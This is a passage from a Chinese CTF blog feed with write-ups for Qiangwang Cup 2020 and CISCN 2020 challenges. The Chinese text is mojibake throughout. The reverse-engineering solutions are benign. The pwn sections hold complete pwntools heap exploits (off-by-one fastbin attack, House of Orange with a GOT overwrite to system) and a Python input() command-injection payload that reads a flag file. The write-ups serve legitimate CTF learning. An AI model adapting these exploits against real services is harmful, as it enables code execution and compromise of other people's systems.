gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size):    sla(&#39;ice&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;ize&#39;,str(size))def edit(idx,offset,size,data):    sla(&#39;ice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;set&#39;,str(offset))    sla(&#39;ize&#39;,str(size))    sa(&#39;tent&#39;,str(data))def free(idx):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))def openfile():    sla(&#39;ice&#39;,&#39;4&#39;)def closefile():    sla(&#39;ice&#39;,&#39;5&#39;)for i in range(8):    add(i,0x100)add(8,0x18)for i in range(7):    free(i)openfile()add(9,0x18)add(0,0x18)free(7)data = p64(0) + p64(0x8040 + 0x20 + 0x110)edit(8,-0x120,0x100,data)data = p64(0x8170) + p64(0x20)edit(0,-0x30,0x18,data)closefile()add(1,0x90)add(2,0x70)add(3,0x60)data = p64(0x121111111111)[:6]print(data)edit(0,-0x7fd8-0x30+2,0x8,data)closefile()ru(&#39;\x12&#39;)libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)data = p64(0x000000000000)[:6]edit(0,-0x7fd8-0x30+2,0x8,data)free_hook = 0x3ed8e8 + libc_baseone = 0x4f322 + libc_basedata = &#39;1&#39; * 8edit(0,-0x82a0,8,p64(free_hook))add(4,0x100)add(5,0x100)edit(5,0,8,p64(one))free(4)# debug()itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;a href=&quot;#å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;/a&gt;å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®&lt;/h1&gt;&lt;h2 id=&quot;babymessage&quot;&gt;&lt;a href=&quot;#ba
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ciscn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®</title>
    <link href="http://chumen77.xyz/2020/08/20/ciscn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>http://chumen77.xyz/2020/08/20/ciscn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®/</id>
    <published>2020-08-20T15:03:02.238Z</published>
    <updated>2020-09-24T02:19:08.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®"><a href="#ciscn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="ciscn  2020åˆèµ›éƒ¨åˆ†é¢˜ç›®"></a>ciscn  2020åˆèµ›éƒ¨åˆ†é¢˜ç›®</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h3><p>ï¿¼<br>çœ‹èµ·æ¥åƒæ˜¯éé½æ¬¡çº¿æ€§æ–¹ç¨‹ï¼Œé‚£å°±æ˜¯å°±æ˜¯ä¸€ä¸ªè§£æ–¹ç¨‹:</p><pre><code class="python">from numpy import *import numpy as npa = np.array([[12, 53, 6,34,58,36,1],            [83,85,12,73,27,96,52],            [78,53,24,36,86,25,46],            [39,78,52,9,62,37,84],            [23,6,14,74,48,12,83],            [27,85,92,42,48,15,72],            [4,6,3,67,0,26,68]])b = np.array([[20247],[40182],[36315],[36518],[26921],[39185],[16546]])result=[]x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[12094],[25270],[19330],[18540],[16386],[21207],[11759]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[10460],[25613],[21135],[24891],[18305],[27415],[12855]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[10899],[24927],[20670],[22926],[18006],[23345],[12602]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[12304],[26622],[19807],[22747],[14233],[24736],[10064]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[14169],[35155],[28962],[33273],[21796],[35185],[14877]])x = np.linalg.solve(a, b)result += x.tolist()flag=&#39;&#39;for i in result:    for f in i:        flag+=chr(int(f+0.5))print(flag)</code></pre><h3 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h3><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œè¦æ±‚è¾“å…¥42ä½çš„flagã€‚</p><pre><code>  Handles = CreateThread(0, 0, StartAddress, 0, 0, 0);  v5 = CreateThread(0, 0, loc_401200, 0, 0, 0);  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0);  WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF);</code></pre><p>è¿™é‡Œå¼€å§‹å¼€å¤šçº¿ç¨‹ã€‚</p><pre><code>void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter){  while ( !IsDebuggerPresent() )    ;  puts((int)&quot;debug!\n&quot;);  exit(0);}</code></pre><p>è¿™é‡Œé¢åˆ†åˆ«æœ‰ä¸€ä¸ªåè°ƒè¯•ã€‚ç”¨çš„IsDebuggerPresentã€‚<br>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>è¿˜æœ‰å¯¹ä½ è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä»¥åä¸</p><pre><code>402150 key             db 0DDh,5Bh,9Eh,1Dh,20h,9Eh,90h,91h,2 dup(90h),91h.rdata:00402150                                         ; DATA XREF: main1+96â†‘r.rdata:00402150                 db 92h,0DEh,8Bh,11h,0D1h,1Eh,9Eh,8Bh,51h,11h.rdata:00402150                 db 50h,51h,8Bh,9Eh,2 dup(5Dh),11h,8Bh,90h,12h,91h.rdata:00402150                 db 50h,12h,0D2h,91h,92h,1Eh,9Eh,90h,0D2h,9Fh</code></pre><p>è¿™42ä¸ªæ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚</p><p>é‚£ä¹ˆæ€è·¯å°±æ˜¯è¿‡äº†åè°ƒè¯•ï¼Œå®šä½å…³é”®å¤„ç†è¾“å…¥çš„ä»£ç å¤„ï¼Œè¿›è¡Œç¡®å®šå…¶æ˜¯æ€ä¹ˆæ“ä½œæ•°æ®çš„ï¼Œä½†æ˜¯çœ‹äº†ä¸€ä¼šæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å¼€å§‹æƒ³åŠæ³•å¯»æ‰¾å­—ç¬¦æ˜ å°„æ¥ç¢°æ’flagã€‚</p><pre><code>1 &gt; 0x922 &gt; 0xd23 &gt; 0x124 &gt; 0x515 &gt; 0x916 &gt; 0xd17 &gt; 0x118 &gt; 0x509&gt; 0x900 &gt; 0x52a &gt; 0x9ec &gt; 0x1ed &gt; 0x5d s &gt; 0x22- &gt; 0x8bf &gt; 0xddl &gt; 0x5ba &gt; 0x9eg &gt; 0x1d</code></pre><pre><code>key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90,  0x91, 0x90, 0x90,   0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,   0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,   0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90,   0xD2, 0x9F]</code></pre><p>ç„¶åè¿›è¡Œä¸€ä½ä½æ›¿æ¢ï¼Œè·å¾—flagï¼š</p><pre><code>flag{a959951b-76ca-4784-add7-93583251ca92}</code></pre><p>ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œè¦æ±‚è¾“å…¥42ä½çš„flagã€‚</p><pre><code>  Handles = CreateThread(0, 0, StartAddress, 0, 0, 0);  v5 = CreateThread(0, 0, loc_401200, 0, 0, 0);  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0);  WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF);</code></pre><p>å¼€å§‹æ–°çš„çº¿ç¨‹ï¼š</p><pre><code>void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter){  while ( !IsDebuggerPresent() )    ;  puts((int)&quot;debug!\n&quot;);  exit(0);}</code></pre><p>è¿™æœ‰ä¸€ä¸ªåè°ƒè¯•ã€‚ç”¨çš„IsDebuggerPresentï¼Œè¿‡çš„åŠæ³•å¾ˆç®€å•ï¼Œåœ¨x64dbgä¸­åœ¨è¿›å…¥IsDebuggerPresentæ—¶ï¼Œè¾“å…¥dbhï¼Œéšè—è°ƒè¯•å™¨å³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/BPs5Q6.png" srcset="/img/loading.gif" alt></p><p>æµ‹è¯•åœ¨è¿™é‡Œdbhå³å¯ã€‚<br>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>è¿˜æœ‰å¯¹ä½ çš„inputè¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä»¥åä¸<br><img src="http://qiqianyun.chumen77.xyz/uPic/vXxpNH.png" srcset="/img/loading.gif" alt></p><p>è¿™42ä¸ªæ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚</p><p>å…ˆè¿‡äº†åè°ƒè¯•ï¼Œå®šä½å…³é”®å¤„ç†è¾“å…¥çš„ä»£ç å¤„ï¼ˆ0x401223ï¼‰ï¼Œè¿›è¡Œç¡®å®šå…¶æ˜¯æ€ä¹ˆæ“ä½œæ•°æ®çš„ï¼Œçœ‹äº†ä¸€ä¼šå‘ç°æ²¡æœ‰å¦‚æ­¤ç®€å•ï¼Œä½†æ˜¯å‘ç°ä½ è¾“å…¥ç‰¹å®šå­—ç¬¦ï¼Œç»è¿‡ç¨‹åºå¤„ç†å‡ºæ¥çš„éƒ½æ˜¯ä¸€æ ·çš„:</p><p>éšæ„è¾“å…¥<code>flag{==2332311111111111111111122222222211}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/vXXqPj.png" srcset="/img/loading.gif" alt></p><p>å¯ä»¥æ‰“å°å­—ç¬¦ä¸ç®—å¤šï¼Œè¿™å°±å¯ä»¥å¯ä»¥å»ºç«‹ä¸€ä¸ªæ˜ å°„è¡¨ï¼š<br>è¾“å…¥<code>flag{1234567890qwertyuiopasdfghjkbnmmmmmm}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/3GOgJx.png" srcset="/img/loading.gif" alt></p><p>å¤„ç†å®Œï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/zsN4o0.png" srcset="/img/loading.gif" alt><br>è·å–æ˜ å°„è¡¨ï¼š</p><pre><code>1 &gt; 0x922 &gt; 0xd23 &gt; 0x124 &gt; 0x515 &gt; 0x916 &gt; 0xd17 &gt; 0x118 &gt; 0x509&gt; 0x900 &gt; 0x52f &gt; 0xddl &gt; 0x5ba &gt; 0x9eg &gt; 0x1da &gt; 0x9ec &gt; 0x1ed &gt; 0x5d s &gt; 0x22- &gt; 0x8b</code></pre><p>æå–ä¸€ä¸‹keyï¼š</p><pre><code>key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90,  0x91, 0x90, 0x90,  0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,   0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,   0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F]</code></pre><p>ç„¶åè¿›è¡Œä¸€ä½ä½æ›¿æ¢ï¼Œè·å¾—flagï¼š</p><pre><code>flag{a959951b-76ca-4784-add7-93583251ca92}</code></pre><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>å¯ä»¥ç¡®å®šä¸€ä¸‹idaæ— æ³•è¯†åˆ«çš„æ•°æ®æ®µï¼Œæ˜¯è¢«èŠ±æŒ‡ä»¤å¤„ç†è¿‡äº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/yY437o.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œå¼€å§‹å¾€ä¸‹è¯†åˆ«å¼‚å¸¸ï¼Œåœ¨åŠ¨æ€è°ƒè¯•åï¼Œæå–ä¸€ä¸‹æ­£ç¡®çš„æ±‡ç¼–ä»£ç ï¼Œæ ¹æ®æ­£ç¡®çš„ç®—æ³•è¿›è¡Œpatchæ‰èŠ±æŒ‡ä»¤ã€‚ï¼ˆè¿˜æ˜¯æ³¨æ„dbhéšè—ä¸€ä¸‹è°ƒè¯•å™¨ã€‚ï¼‰</p><pre><code class="c">void __stdcall __noreturn sub_401120(LPVOID lpThreadParameter){  int v1; // ebx  CreateThread(0, 0, hHandle, 0, 0, 0);  WaitForSingleObject(hHandle, 0xFFFFFFFF);  inputs[0] = (inputs[0] &lt;&lt; 6) ^ ((signed int)(unsigned __int8)inputs[0] &gt;&gt; 2);  inputs[0] ^= 0x23u;  Sleep(6u);  v1 = *(unsigned __int8 *)(__readfsdword(0x30u) + 2);  inputs[0] += 0x23;  JUMPOUT(loc_4011EC);}</code></pre><p>Patch åçš„ï¼Œå‹‰å¼ºå¯ä»¥çœ‹æ‡‚ã€‚å…¶ä¸­è‚¯å®šæ˜¯<code>inputs[i]</code>è¿›è¡Œå¤„ç†çš„ï¼Œå…¶ä¸­ä¹Ÿæœ‰ä¸€ä¸ªåœ°æ–¹åœ¨åŠ 1ã€‚</p><pre><code class="python">key = [    0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90,     0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,     0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,     0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90,     0xD2, 0x9F]flag = &#39;&#39;for i in range(len(key)):    key[i] -= 0x23    key[i] &amp;= 0xff #æœ‰å¯èƒ½è¿ç®—åä¼šå°äº0çš„ï¼Œæ‰€ä»¥ç»™å¤„ç†ä¸€ä¸‹    key[i] ^= 0x23    key[i] = ((key[i] &gt;&gt; 6) ^ (key[i] &lt;&lt; 2)) &amp; 0xff    flag += chr(key[i])print(flag)</code></pre><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>ubuntu 16ï¼Œoff by oneï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œéœ€è¦æ”»å‡»stdoutæ³„æ¼libcåœ°å€ã€‚</p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>ç”¨off by oneï¼Œæ„é€ å‡ºchunk overlapping ,å¹¶ä¸”æƒ³åŠæ³•é‡Šæ”¾å †å—ï¼Œè®©<code>main_arena_</code>è½åœ¨fastbinä¸­</li><li>ä¿®æ”¹è¿™ä¸ª<code>main_arena_</code>çš„æœ€å2ä¸ªå­—èŠ‚ï¼Œè®©å…¶æŒ‡å‘<code>stdout</code>é™„è¿‘å¸¦æœ‰<code>0x7f</code>çš„åœ°å€ï¼ˆå±äº0x70çš„fastbinå †å—ï¼‰</li><li>ä½¿ç”¨chunk overlapping ï¼Œæ¥ä¿®æ”¹ç©ºé—²çš„fastbin chainï¼Œä½¿å…¶ä¸­ä¸€ä¸ªæŒ‡å‘è¿™ä¸ªå¸¦æœ‰<code>main_arena</code>çš„å †å—ï¼Œè¿›è¡Œfastbin attackï¼Œä¿®æ”¹åˆ°stdoutå¤„çš„å†…å®¹ï¼Œleak libc</li><li>é‡å¤ä»¥ä¸Šçš„æ­¥éª¤ï¼Œæ„é€ ä¸€ä¸ªå †å—åˆ°<code>malloc_hook</code>å¤„ï¼Œå†™ä¸Šone gadget å³å¯ã€‚</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;101.200.53.148&#39;,34521)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def alloca(idx,size,data):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;idx&#39;,str(idx))    sla(&#39;len&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;&gt;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))# def pwn():def leak_addr():    alloca(0,1,&#39;aa&#39;)    alloca(1,0x4f0,&#39;\xdd\xd5&#39;)    alloca(2,0xb0,&#39;aa&#39;)    alloca(3,0x60,&#39;aa&#39;)    free(0)    alloca(0,0x18,&#39;/bin/sh\x00&#39;*2 + p64(0) + &#39;\xc1&#39;)    free(1)    alloca(1,0x60,&#39;\xdd\xd5&#39;)    alloca(4,0x60,&#39;\x50\x47&#39;)    alloca(5,0x60,&#39;\x50\x47&#39;)    alloca(6,0x60,&#39;\x50\x47&#39;)    alloca(7,0x30,&#39;aa&#39;)    alloca(8,0x160,&#39;aaaaaa&#39;)    alloca(9,0x60,&#39;aa&#39;)    alloca(10,0x30,&#39;aa&#39;)    free(7)    alloca(0,0x38, p64(0) * 7 + &#39;\xe1&#39;)    free(8)    free(4)    free(9)    free(5)    payload = &#39;a&#39; * 0x160    alloca(11,0x180,payload)    payload = &#39;a&#39; * 0x160 + p64(0) + p64(0x71) + &#39;\x20&#39;    alloca(11,0x180,payload)    alloca(12,0x60,&#39; &#39;)    # debug()    alloca(13,0x60,&#39; &#39;)    alloca(14,0x60,&#39;\xed\xca&#39;)    payload = &#39;a&#39; * 3 + p64(0) * 6 + p64(0xfbad3c80)+p64(0)*3+p8(0)    alloca(15,0x60,payload)# leak_addr()leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(10)        leak = uu64(r(6))        if leak == 0x7ff81b57b6a3:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        io = process(&#39;./pwn&#39;)        # io = remote(&#39;101.200.53.148&#39;,34521)        continueinfo_addr(&#39;leak&#39;,leak)libc_base = leak - 0x3c56a3info_addr(&#39;libc_base&#39;,libc_base)rec = 0xf1207 + libc_basedef getshell():    alloca(7,0x60,&#39; &#39;)    alloca(8,0x60,&#39; &#39;)    free(0)    free(11)    free(6)    alloca(5,0x60,&#39; &#39;)    alloca(4,0x60,&#39; &#39;)    alloca(0,0x60,&#39;\xed\xca&#39;)    free(4)    free(13)    free(12)    payload = &#39;a&#39; * 0x80 + p64(0) + p64(0x71) + &#39;\x90&#39;    alloca(13,0x90,payload)    alloca(11,0x60,&#39;\x20\xd0&#39;)    alloca(6,0x60,&#39;\x20\xd0&#39;)    alloca(4,0x60,&#39;\x20\xd0&#39;)    payload = &#39;a&#39; * 3 + p64(0) * 2 + p64(rec)    alloca(5,0x60,payload)    # debug()    sleep(0.1)    # alloca(8,30,&#39;1&#39;)getshell()itr()</code></pre><p>æ·±å¤œå†™çš„expï¼Œä¼°è®¡æ„é€ å †å—çš„æ€è·¯æœ‰ç‚¹æ··ä¹±ã€‚ğŸ¤£ğŸ¤£</p><h3 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h3><p>æ¯”èµ›æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯ä¸ªwebpwnï¼Œä¸æ•¢å»åšã€‚ä½†æ˜¯å¾ˆå¤šé˜Ÿä¼åšå‡ºæ¥äº†ï¼Œè¯•ç€å»åšï¼Œçœ‹åˆ°server.py,ä¸äº†è§£jscï¼Œä»¥ä¸ºåªèƒ½æ‰§è¡Œjsä»£ç ï¼ŒåºŸäº†å¾ˆå¤§ç²¾åŠ›å†™jsæ¥è¯»å–flagï¼Œè¿˜æ˜¯æ²¡æœ‰æˆåŠŸã€‚tclã€‚</p><p>æœ€åçœ‹wpï¼ŒçŸ¥é“äº†inputå‡½æ•°æœ¬èº«å°±æ˜¯ä¸ªæ¼æ´å‡½æ•°ï¼Œå…¶ä¼šå°†stdinè¾“å…¥çš„å†…å®¹å½“åšpythonä»£ç å»æ‰§è¡Œï¼ˆå°±åƒæ‰§è¡Œè®¡ç®—å¼ä¸€æ ·ï¼Œå°†å…¶çœ‹åšpythonä»£ç ï¼Œé€šè¿‡è®¡ç®—è¿”å›ç»“æœï¼‰ã€‚å½“ç„¶å¯ä»¥ç”¨å®ƒæ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡éœ€è¦å…ˆå€’å…¥osçš„æ¨¡å—ï¼Œç„¶åæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><pre><code class="python">__import__(&#39;os&#39;).system(&#39;cat /home/ctf/flag&#39;)</code></pre><p>å¯¹äºpythonï¼Œinputå‡½æ•°æ¼æ´ï¼Œå‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/weixin_34221332/article/details/92713257" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34221332/article/details/92713257</a></p><h3 id="no-free"><a href="#no-free" class="headerlink" title="no free"></a>no free</h3><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><pre><code class="python">*] &#39;/ctf/work/ciscn2020/pwn/nofree/pwn&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>å¯ä»¥çœ‹åˆ°ä¿æŠ¤å¼€çš„è¿˜æ˜¯å¾ˆå°‘çš„ï¼Œç„¶åno free æ˜æ˜¾éœ€è¦ä½¿ç”¨åˆ°hos of orangeè¿›è¡Œæ”»å‡»äº†ã€‚</p><h5 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h5><ul><li>åªèƒ½ç”³è¯·0-0x90å¤§å°çš„å †å—ï¼Œå †å—å·è‡ªå®šä¹‰0-2ï¼Œä¸”ç”±äºæ²¡æœ‰å¯¹å·²ç»å­˜åœ¨çš„å †å—å·éªŒè¯ï¼Œå¯ä»¥è¿›è¡Œæ— é™æ¬¡çš„ç”³è¯·åŒä¸€ä¸ªåºå·çš„å †å—ã€‚</li><li>å †å—åœ°å€å­˜åœ¨äº<code>0x06020C0  + 0x100</code> size è·Ÿåœ¨åé¢ã€‚</li><li><code>strdup</code> ç›¸å½“äº<code>malloc(stren(s))</code> </li></ul><h5 id="editå‡½æ•°"><a href="#editå‡½æ•°" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h5><ul><li>å€˜è‹¥è¾“å…¥æ²¡æœ‰å­˜åœ¨çš„å †å—idxï¼Œç¨‹åºä¼šç›´æ¥è¿”å›</li><li><code>read_diy(key[2 * idx + 0x20], (unsigned __int64)key[2 * idx + 0x21]);</code> è¿™é‡Œç”±äºæ˜¯è¿™æ ·çš„åˆ¤æ–­ï¼Œç»“åˆaddçš„<code>strdup</code> å°±é€ æˆäº†å †æº¢å‡ºã€‚</li></ul><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p>éš¾ç‚¹åŸºæœ¬å°±åœ¨æ³„æ¼libcäº†ã€‚</p><ul><li>åˆ©ç”¨ç¨‹åºçš„å †æº¢å‡ºæ¼æ´ï¼Œä¿®æ”¹ä¸€ä¸‹top chunk</li><li>ç”³è¯·å¤šæ¬¡0å·0x90çš„å †å—ï¼Œæ¥æ¶ˆè€—ä¿®æ”¹åçš„top chunkï¼Œåˆ°è¾¾ä¸€å®šç¨‹åº¦åè¿›è¡Œhos of orangeæ”»å‡»ï¼Œè·å–ä¸€ä¸ªç©ºé—²çš„è¿›å…¥fastbinçš„å †å—</li><li>åˆ©ç”¨å †æº¢å‡ºï¼Œåœ¨fastbin chainä¸ŠåŠ ä¸€ä¸ª<code>0x06020C0  + 0x100</code> ï¼Œå‡†å¤‡è¿›è¡Œfastbin attackï¼Œæ¥è·å–ä¸€ä¸ªåœ¨å­˜æ”¾å †å—åœ°å€çš„å †å—ï¼Œè¿™æ ·å°±å®ç°äº†ä»»æ„åœ°å€å†™ã€‚</li><li>ä¿®æ”¹<code>atoi</code> çš„got è¡¨ä¸º printfï¼Œåˆ›é€ å‡ºä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li><li>åˆ©ç”¨addä¸­çš„atoiï¼Œå®Œæˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ï¼Œæ³„æ¼å‡ºlibcåœ°å€</li><li>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¿®æ”¹<code>atoi</code> çš„gotè¡¨ä¸º<code>elf.plt[&#39;atoi&#39;] + 6</code> ï¼Œè®©å…¶å®Œæˆä¸€ä¸‹è§£æï¼Œé‡æ–°æ„é€ å‡ºæ­£å¸¸çš„atoiï¼ˆåŸå› ï¼šæµ‹é€Ÿä¸­å‘ç°ï¼Œç”¨editåŠŸèƒ½è¾“å…¥idxåç›´æ¥é€€å‡ºï¼Œåªèƒ½è®©å…¶æ¢å¤æ­£å¸¸ï¼Œå†è¿›è¡Œä»»æ„åœ°å€å†™ï¼‰</li><li>ä¿®æ”¹<code>atoi</code> çš„gotä¸ºsystemçš„åœ°å€ï¼Œç„¶ååœ¨å‘é€ä¸ª<code>sh</code> ï¼Œå®Œæˆ<code>system(sh)</code></li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;idx&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def edit(idx,data):    sla(&#39;&gt;&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&quot;content&quot;,str(data))payload = &#39;a&#39; * 0x40add(0,0x90,payload)payload = &#39;a&#39; * 0x40 + p64(0) + p64(0xfb1)edit(0,payload)payload = &#39;a&#39; * 0x90for i in range(24):    add(0,0x90,payload)payload = &#39;a&#39; * 0x10add(1,0x90,payload)payload = &#39;a&#39; * 0x70add(0,0x70,payload)payload = &#39;\x00&#39; * 0x18 + p64(0x71) + p64(0x6020C0 + 0x100)edit(1,payload)payload = 0x60 * 